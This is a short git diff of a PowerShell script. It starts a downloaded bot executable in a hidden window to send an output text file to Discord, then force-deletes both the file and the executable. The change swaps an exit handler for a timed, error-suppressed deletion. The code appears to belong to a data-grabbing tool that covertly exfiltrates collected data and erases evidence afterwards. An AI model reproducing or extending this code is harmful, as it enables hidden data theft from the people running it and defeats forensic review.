@@ -28,8 +28,8 @@ if ($SendToDiscord.ToLower() -eq 'y') {
     # Send the text file to Discord using the bot
     Start-Process -WindowStyle Hidden -FilePath $botdownloadpath -ArgumentList "-File $outputFilePath"
     # Delete the log and exe files on exit
-    Register-EngineEvent PowerShell.Exiting -Action {
-        Remove-Item -Path $outputFilePath -Force
-        Remove-Item -Path $botdownloadpath -Force
-    } | Out-Null
+    Start-Sleep -Seconds 5
+    Remove-Item -Path $outputFilePath -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $botdownloadpath -Force -ErrorAction SilentlyContinue
+}
 }
